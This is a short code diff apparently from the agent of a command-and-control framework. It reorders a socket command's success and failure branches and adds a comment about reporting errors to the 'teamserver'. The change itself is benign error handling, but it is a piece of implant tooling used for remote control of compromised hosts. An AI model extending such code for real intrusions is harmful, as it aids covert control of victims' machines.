@@ -2839,19 +2839,20 @@ VOID CommandSocket( PPARSER Parser )
                 Socket = Socket->Next;
             }
 
-            if ( ! Success )
-            {
-                PackageAddInt32( Package, SocketID );
-                PackageAddInt32( Package, Type );
-                PackageAddInt32( Package, FALSE );
-                PackageAddInt32( Package, Instance.Win32.WSAGetLastError() );
-            }
-            else
+            if ( Success )
             {
                 /* destroy the package and exit this command function */
                 PackageDestroy( Package );
                 Package = NULL;
                 return;
+            }
+            else
+            {
+                /* report the error to the teamserver */
+                PackageAddInt32( Package, SocketID );
+                PackageAddInt32( Package, Type );
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, Instance.Win32.WSAGetLastError() );
             }
         }
 
